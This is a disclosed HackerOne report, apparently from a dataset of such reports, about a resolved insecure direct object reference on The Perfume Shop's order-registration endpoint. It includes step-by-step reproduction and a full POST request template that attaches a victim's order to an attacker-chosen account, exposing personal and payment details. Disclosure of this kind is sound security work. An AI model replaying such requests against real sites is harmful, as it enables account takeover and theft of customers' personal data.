---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1618100'
original_report_id: '1618100'
title: PII Disclosure At `theperfumeshop.com/register/forOrder`
weakness: Insecure Direct Object Reference (IDOR)
team_handle: watson_group
created_at: '2022-06-28T16:21:34.756Z'
disclosed_at: '2024-01-23T08:54:50.075Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 102
asset_identifier: The Perfume Shop
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# PII Disclosure At `theperfumeshop.com/register/forOrder`

## Metadata

- HackerOne Report ID: 1618100
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: watson_group
- Disclosed At: 2024-01-23T08:54:50.075Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

Hello there! I found a way to accesing any user's PII (full address, phone number, full name, ** all orders**, payment details [if the victim already saved before] )  who created a order in The Perfume Shop. 

This is happening via https://theperfumeshop.com/register/forOrder endpoint. I realized this endpoint after the guest checkout process was completed.

## Steps To Reproduce:

1. Open https://theperfumeshop.com website on your browser ( do not login to any account ).
2. Go to a product and add to your basket then, get your CSRF token and cookies.
3. Find a order ID who you want to attack. You can try with my order ID: `664448593`
4. Repeat this request on Burp Suite after replacing with the CSRF token, cookies, an email that not registered before and the order ID of the victim:

```http
POST /register/forOrder HTTP/2
Host: www.theperfumeshop.com
Cookie: █████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: █████checkout/orderConfirmationByReferenceId/PROD_00000000000
Content-Type: application/x-www-form-urlencoded
Origin: https://www.theperfumeshop.com
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

orderCode=[order-id-of-victim]&email=[put-here-random-email]&associateCard=yes&termsCheck=1&dateOfBirth.day=██████████&dateOfBirth.month=█████████&dateOfBirth.year=███&pwd=███&checkPwd=██████&CSRFToken=[csrf-token-here]
```

You'll see `Location: ███████serverError` on response, this meant attack succesfully completed.

5. Go to ████████login page and login with the random email that you put in the request and this password -> `████`. 
6. After succesfully logged into the account, check addressses, orders and personal information.

Here's a proof of concept:

██████

Also, I set this report severity to Critical because CVSS calculator's response and comment of @lesswood in the #1542373:

> ███████


So, since I can easily harvest PII (full address, phone number, full name, ** all orders**, payment details [if the victim already saved before] ) and take over a system (can delete orders from victim's own account) without any privileges.

## Impact

Accesing any user's PII (full address, phone number, full name, ** all orders**, payment details [if the victim already saved before] )  who created a order in The Perfume Shop.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
